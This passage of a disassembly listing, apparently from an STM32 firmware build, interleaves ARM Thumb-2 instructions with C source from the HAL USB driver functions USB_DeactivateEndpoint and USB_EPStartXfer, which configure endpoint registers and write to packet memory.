 8006abc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006ac0:	82fb      	strh	r3, [r7, #22]
 8006ac2:	687a      	ldr	r2, [r7, #4]
 8006ac4:	683b      	ldr	r3, [r7, #0]
 8006ac6:	781b      	ldrb	r3, [r3, #0]
 8006ac8:	009b      	lsls	r3, r3, #2
 8006aca:	441a      	add	r2, r3
 8006acc:	8afb      	ldrh	r3, [r7, #22]
 8006ace:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006ad2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006ad6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006ada:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006ade:	b29b      	uxth	r3, r3
 8006ae0:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006ae2:	687a      	ldr	r2, [r7, #4]
 8006ae4:	683b      	ldr	r3, [r7, #0]
 8006ae6:	781b      	ldrb	r3, [r3, #0]
 8006ae8:	009b      	lsls	r3, r3, #2
 8006aea:	4413      	add	r3, r2
 8006aec:	881b      	ldrh	r3, [r3, #0]
 8006aee:	b29b      	uxth	r3, r3
 8006af0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006af4:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006af8:	82bb      	strh	r3, [r7, #20]
 8006afa:	687a      	ldr	r2, [r7, #4]
 8006afc:	683b      	ldr	r3, [r7, #0]
 8006afe:	781b      	ldrb	r3, [r3, #0]
 8006b00:	009b      	lsls	r3, r3, #2
 8006b02:	441a      	add	r2, r3
 8006b04:	8abb      	ldrh	r3, [r7, #20]
 8006b06:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b0a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b0e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006b12:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b16:	b29b      	uxth	r3, r3
 8006b18:	8013      	strh	r3, [r2, #0]
 8006b1a:	e0a3      	b.n	8006c64 <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006b1c:	687a      	ldr	r2, [r7, #4]
 8006b1e:	683b      	ldr	r3, [r7, #0]
 8006b20:	781b      	ldrb	r3, [r3, #0]
 8006b22:	009b      	lsls	r3, r3, #2
 8006b24:	4413      	add	r3, r2
 8006b26:	881b      	ldrh	r3, [r3, #0]
 8006b28:	85fb      	strh	r3, [r7, #46]	; 0x2e
 8006b2a:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 8006b2c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006b30:	2b00      	cmp	r3, #0
 8006b32:	d01b      	beq.n	8006b6c <USB_DeactivateEndpoint+0x2d4>
 8006b34:	687a      	ldr	r2, [r7, #4]
 8006b36:	683b      	ldr	r3, [r7, #0]
 8006b38:	781b      	ldrb	r3, [r3, #0]
 8006b3a:	009b      	lsls	r3, r3, #2
 8006b3c:	4413      	add	r3, r2
 8006b3e:	881b      	ldrh	r3, [r3, #0]
 8006b40:	b29b      	uxth	r3, r3
 8006b42:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b46:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b4a:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006b4c:	687a      	ldr	r2, [r7, #4]
 8006b4e:	683b      	ldr	r3, [r7, #0]
 8006b50:	781b      	ldrb	r3, [r3, #0]
 8006b52:	009b      	lsls	r3, r3, #2
 8006b54:	441a      	add	r2, r3
 8006b56:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 8006b58:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b5c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b60:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006b64:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b68:	b29b      	uxth	r3, r3
 8006b6a:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006b6c:	687a      	ldr	r2, [r7, #4]
 8006b6e:	683b      	ldr	r3, [r7, #0]
 8006b70:	781b      	ldrb	r3, [r3, #0]
 8006b72:	009b      	lsls	r3, r3, #2
 8006b74:	4413      	add	r3, r2
 8006b76:	881b      	ldrh	r3, [r3, #0]
 8006b78:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006b7a:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006b7c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006b80:	2b00      	cmp	r3, #0
 8006b82:	d01b      	beq.n	8006bbc <USB_DeactivateEndpoint+0x324>
 8006b84:	687a      	ldr	r2, [r7, #4]
 8006b86:	683b      	ldr	r3, [r7, #0]
 8006b88:	781b      	ldrb	r3, [r3, #0]
 8006b8a:	009b      	lsls	r3, r3, #2
 8006b8c:	4413      	add	r3, r2
 8006b8e:	881b      	ldrh	r3, [r3, #0]
 8006b90:	b29b      	uxth	r3, r3
 8006b92:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b96:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b9a:	853b      	strh	r3, [r7, #40]	; 0x28
 8006b9c:	687a      	ldr	r2, [r7, #4]
 8006b9e:	683b      	ldr	r3, [r7, #0]
 8006ba0:	781b      	ldrb	r3, [r3, #0]
 8006ba2:	009b      	lsls	r3, r3, #2
 8006ba4:	441a      	add	r2, r3
 8006ba6:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8006ba8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006bac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006bb0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006bb4:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006bb8:	b29b      	uxth	r3, r3
 8006bba:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 8006bbc:	687a      	ldr	r2, [r7, #4]
 8006bbe:	683b      	ldr	r3, [r7, #0]
 8006bc0:	781b      	ldrb	r3, [r3, #0]
 8006bc2:	009b      	lsls	r3, r3, #2
 8006bc4:	4413      	add	r3, r2
 8006bc6:	881b      	ldrh	r3, [r3, #0]
 8006bc8:	b29b      	uxth	r3, r3
 8006bca:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006bce:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006bd2:	84fb      	strh	r3, [r7, #38]	; 0x26
 8006bd4:	687a      	ldr	r2, [r7, #4]
 8006bd6:	683b      	ldr	r3, [r7, #0]
 8006bd8:	781b      	ldrb	r3, [r3, #0]
 8006bda:	009b      	lsls	r3, r3, #2
 8006bdc:	441a      	add	r2, r3
 8006bde:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 8006be0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006be4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006be8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006bec:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006bf0:	b29b      	uxth	r3, r3
 8006bf2:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006bf4:	687a      	ldr	r2, [r7, #4]
 8006bf6:	683b      	ldr	r3, [r7, #0]
 8006bf8:	781b      	ldrb	r3, [r3, #0]
 8006bfa:	009b      	lsls	r3, r3, #2
 8006bfc:	4413      	add	r3, r2
 8006bfe:	881b      	ldrh	r3, [r3, #0]
 8006c00:	b29b      	uxth	r3, r3
 8006c02:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006c06:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006c0a:	84bb      	strh	r3, [r7, #36]	; 0x24
 8006c0c:	687a      	ldr	r2, [r7, #4]
 8006c0e:	683b      	ldr	r3, [r7, #0]
 8006c10:	781b      	ldrb	r3, [r3, #0]
 8006c12:	009b      	lsls	r3, r3, #2
 8006c14:	441a      	add	r2, r3
 8006c16:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 8006c18:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006c1c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006c20:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006c24:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006c28:	b29b      	uxth	r3, r3
 8006c2a:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006c2c:	687a      	ldr	r2, [r7, #4]
 8006c2e:	683b      	ldr	r3, [r7, #0]
 8006c30:	781b      	ldrb	r3, [r3, #0]
 8006c32:	009b      	lsls	r3, r3, #2
 8006c34:	4413      	add	r3, r2
 8006c36:	881b      	ldrh	r3, [r3, #0]
 8006c38:	b29b      	uxth	r3, r3
 8006c3a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006c3e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006c42:	847b      	strh	r3, [r7, #34]	; 0x22
 8006c44:	687a      	ldr	r2, [r7, #4]
 8006c46:	683b      	ldr	r3, [r7, #0]
 8006c48:	781b      	ldrb	r3, [r3, #0]
 8006c4a:	009b      	lsls	r3, r3, #2
 8006c4c:	441a      	add	r2, r3
 8006c4e:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006c50:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006c54:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006c58:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006c5c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006c60:	b29b      	uxth	r3, r3
 8006c62:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8006c64:	2300      	movs	r3, #0
}
 8006c66:	4618      	mov	r0, r3
 8006c68:	3734      	adds	r7, #52	; 0x34
 8006c6a:	46bd      	mov	sp, r7
 8006c6c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006c70:	4770      	bx	lr

08006c72 <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006c72:	b580      	push	{r7, lr}
 8006c74:	b0c2      	sub	sp, #264	; 0x108
 8006c76:	af00      	add	r7, sp, #0
 8006c78:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c7c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c80:	6018      	str	r0, [r3, #0]
 8006c82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c8a:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006c8c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c90:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c94:	681b      	ldr	r3, [r3, #0]
 8006c96:	785b      	ldrb	r3, [r3, #1]
 8006c98:	2b01      	cmp	r3, #1
 8006c9a:	f040 86b7 	bne.w	8007a0c <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006c9e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ca2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ca6:	681b      	ldr	r3, [r3, #0]
 8006ca8:	699a      	ldr	r2, [r3, #24]
 8006caa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cb2:	681b      	ldr	r3, [r3, #0]
 8006cb4:	691b      	ldr	r3, [r3, #16]
 8006cb6:	429a      	cmp	r2, r3
 8006cb8:	d908      	bls.n	8006ccc <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006cba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cbe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cc2:	681b      	ldr	r3, [r3, #0]
 8006cc4:	691b      	ldr	r3, [r3, #16]
 8006cc6:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006cca:	e007      	b.n	8006cdc <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006ccc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cd0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cd4:	681b      	ldr	r3, [r3, #0]
 8006cd6:	699b      	ldr	r3, [r3, #24]
 8006cd8:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006cdc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ce0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ce4:	681b      	ldr	r3, [r3, #0]
 8006ce6:	7b1b      	ldrb	r3, [r3, #12]
 8006ce8:	2b00      	cmp	r3, #0
 8006cea:	d13a      	bne.n	8006d62 <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006cec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cf0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cf4:	681b      	ldr	r3, [r3, #0]
 8006cf6:	6959      	ldr	r1, [r3, #20]
 8006cf8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cfc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d00:	681b      	ldr	r3, [r3, #0]
 8006d02:	88da      	ldrh	r2, [r3, #6]
 8006d04:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d08:	b29b      	uxth	r3, r3
 8006d0a:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006d0e:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006d12:	6800      	ldr	r0, [r0, #0]
 8006d14:	f001 fcb9 	bl	800868a <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006d18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d1c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d20:	681b      	ldr	r3, [r3, #0]
 8006d22:	613b      	str	r3, [r7, #16]
 8006d24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d28:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d2c:	681b      	ldr	r3, [r3, #0]
 8006d2e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006d32:	b29b      	uxth	r3, r3
 8006d34:	461a      	mov	r2, r3
 8006d36:	693b      	ldr	r3, [r7, #16]
 8006d38:	4413      	add	r3, r2
 8006d3a:	613b      	str	r3, [r7, #16]
 8006d3c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d40:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d44:	681b      	ldr	r3, [r3, #0]
 8006d46:	781b      	ldrb	r3, [r3, #0]
 8006d48:	00da      	lsls	r2, r3, #3
 8006d4a:	693b      	ldr	r3, [r7, #16]
 8006d4c:	4413      	add	r3, r2
 8006d4e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006d52:	60fb      	str	r3, [r7, #12]
 8006d54:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d58:	b29a      	uxth	r2, r3
 8006d5a:	68fb      	ldr	r3, [r7, #12]
 8006d5c:	801a      	strh	r2, [r3, #0]
 8006d5e:	f000 be1f 	b.w	80079a0 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006d62:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d66:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d6a:	681b      	ldr	r3, [r3, #0]
 8006d6c:	78db      	ldrb	r3, [r3, #3]
 8006d6e:	2b02      	cmp	r3, #2
 8006d70:	f040 8462 	bne.w	8007638 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006d74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d7c:	681b      	ldr	r3, [r3, #0]
 8006d7e:	6a1a      	ldr	r2, [r3, #32]
 8006d80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d84:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d88:	681b      	ldr	r3, [r3, #0]
 8006d8a:	691b      	ldr	r3, [r3, #16]
 8006d8c:	429a      	cmp	r2, r3
 8006d8e:	f240 83df 	bls.w	8007550 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006d92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d96:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d9a:	681a      	ldr	r2, [r3, #0]
 8006d9c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006da0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006da4:	681b      	ldr	r3, [r3, #0]
 8006da6:	781b      	ldrb	r3, [r3, #0]
 8006da8:	009b      	lsls	r3, r3, #2
 8006daa:	4413      	add	r3, r2
 8006dac:	881b      	ldrh	r3, [r3, #0]
 8006dae:	b29b      	uxth	r3, r3
 8006db0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006db4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006db8:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006dbc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dc0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006dc4:	681a      	ldr	r2, [r3, #0]
 8006dc6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dce:	681b      	ldr	r3, [r3, #0]
 8006dd0:	781b      	ldrb	r3, [r3, #0]
 8006dd2:	009b      	lsls	r3, r3, #2
 8006dd4:	441a      	add	r2, r3
 8006dd6:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006dda:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006dde:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006de2:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006de6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006dea:	b29b      	uxth	r3, r3
 8006dec:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006dee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006df2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006df6:	681b      	ldr	r3, [r3, #0]
 8006df8:	6a1a      	ldr	r2, [r3, #32]
 8006dfa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006dfe:	1ad2      	subs	r2, r2, r3
 8006e00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e08:	681b      	ldr	r3, [r3, #0]
 8006e0a:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006e0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e10:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e14:	681a      	ldr	r2, [r3, #0]
 8006e16:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e1a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e1e:	681b      	ldr	r3, [r3, #0]
 8006e20:	781b      	ldrb	r3, [r3, #0]
 8006e22:	009b      	lsls	r3, r3, #2
 8006e24:	4413      	add	r3, r2
 8006e26:	881b      	ldrh	r3, [r3, #0]
 8006e28:	b29b      	uxth	r3, r3
 8006e2a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006e2e:	2b00      	cmp	r3, #0
 8006e30:	f000 81c7 	beq.w	80071c2 <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006e34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e38:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e3c:	681b      	ldr	r3, [r3, #0]
 8006e3e:	633b      	str	r3, [r7, #48]	; 0x30
 8006e40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e48:	681b      	ldr	r3, [r3, #0]
 8006e4a:	785b      	ldrb	r3, [r3, #1]
 8006e4c:	2b00      	cmp	r3, #0
 8006e4e:	d177      	bne.n	8006f40 <USB_EPStartXfer+0x2ce>
 8006e50:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e54:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e58:	681b      	ldr	r3, [r3, #0]
 8006e5a:	62bb      	str	r3, [r7, #40]	; 0x28
 8006e5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e60:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e64:	681b      	ldr	r3, [r3, #0]
 8006e66:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006e6a:	b29b      	uxth	r3, r3
 8006e6c:	461a      	mov	r2, r3
 8006e6e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006e70:	4413      	add	r3, r2
 8006e72:	62bb      	str	r3, [r7, #40]	; 0x28
 8006e74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e7c:	681b      	ldr	r3, [r3, #0]
 8006e7e:	781b      	ldrb	r3, [r3, #0]
 8006e80:	00da      	lsls	r2, r3, #3
 8006e82:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006e84:	4413      	add	r3, r2
 8006e86:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006e8a:	627b      	str	r3, [r7, #36]	; 0x24
 8006e8c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e8e:	881b      	ldrh	r3, [r3, #0]
 8006e90:	b29b      	uxth	r3, r3
 8006e92:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006e96:	b29a      	uxth	r2, r3
 8006e98:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e9a:	801a      	strh	r2, [r3, #0]
 8006e9c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ea0:	2b3e      	cmp	r3, #62	; 0x3e
 8006ea2:	d921      	bls.n	8006ee8 <USB_EPStartXfer+0x276>
 8006ea4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ea8:	095b      	lsrs	r3, r3, #5
 8006eaa:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006eae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eb2:	f003 031f 	and.w	r3, r3, #31
 8006eb6:	2b00      	cmp	r3, #0
 8006eb8:	d104      	bne.n	8006ec4 <USB_EPStartXfer+0x252>
 8006eba:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006ebe:	3b01      	subs	r3, #1
 8006ec0:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006ec4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ec6:	881b      	ldrh	r3, [r3, #0]
 8006ec8:	b29a      	uxth	r2, r3
 8006eca:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006ece:	b29b      	uxth	r3, r3
 8006ed0:	029b      	lsls	r3, r3, #10
 8006ed2:	b29b      	uxth	r3, r3
 8006ed4:	4313      	orrs	r3, r2
 8006ed6:	b29b      	uxth	r3, r3
 8006ed8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006edc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006ee0:	b29a      	uxth	r2, r3
 8006ee2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ee4:	801a      	strh	r2, [r3, #0]
 8006ee6:	e050      	b.n	8006f8a <USB_EPStartXfer+0x318>
 8006ee8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eec:	2b00      	cmp	r3, #0
 8006eee:	d10a      	bne.n	8006f06 <USB_EPStartXfer+0x294>
 8006ef0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ef2:	881b      	ldrh	r3, [r3, #0]
 8006ef4:	b29b      	uxth	r3, r3
 8006ef6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006efa:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006efe:	b29a      	uxth	r2, r3
 8006f00:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f02:	801a      	strh	r2, [r3, #0]
 8006f04:	e041      	b.n	8006f8a <USB_EPStartXfer+0x318>
 8006f06:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f0a:	085b      	lsrs	r3, r3, #1
 8006f0c:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006f10:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f14:	f003 0301 	and.w	r3, r3, #1
 8006f18:	2b00      	cmp	r3, #0
 8006f1a:	d004      	beq.n	8006f26 <USB_EPStartXfer+0x2b4>
 8006f1c:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006f20:	3301      	adds	r3, #1
 8006f22:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006f26:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f28:	881b      	ldrh	r3, [r3, #0]
 8006f2a:	b29a      	uxth	r2, r3
 8006f2c:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006f30:	b29b      	uxth	r3, r3
 8006f32:	029b      	lsls	r3, r3, #10
 8006f34:	b29b      	uxth	r3, r3
 8006f36:	4313      	orrs	r3, r2
 8006f38:	b29a      	uxth	r2, r3
 8006f3a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f3c:	801a      	strh	r2, [r3, #0]
 8006f3e:	e024      	b.n	8006f8a <USB_EPStartXfer+0x318>
 8006f40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f48:	681b      	ldr	r3, [r3, #0]
 8006f4a:	785b      	ldrb	r3, [r3, #1]
 8006f4c:	2b01      	cmp	r3, #1
 8006f4e:	d11c      	bne.n	8006f8a <USB_EPStartXfer+0x318>
 8006f50:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f54:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f58:	681b      	ldr	r3, [r3, #0]
 8006f5a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006f5e:	b29b      	uxth	r3, r3
 8006f60:	461a      	mov	r2, r3
 8006f62:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006f64:	4413      	add	r3, r2
 8006f66:	633b      	str	r3, [r7, #48]	; 0x30
 8006f68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f6c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f70:	681b      	ldr	r3, [r3, #0]
 8006f72:	781b      	ldrb	r3, [r3, #0]
 8006f74:	00da      	lsls	r2, r3, #3
 8006f76:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006f78:	4413      	add	r3, r2
 8006f7a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006f7e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006f80:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f84:	b29a      	uxth	r2, r3
 8006f86:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006f88:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006f8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f8e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f92:	681b      	ldr	r3, [r3, #0]
 8006f94:	895b      	ldrh	r3, [r3, #10]
 8006f96:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006f9a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f9e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fa2:	681b      	ldr	r3, [r3, #0]
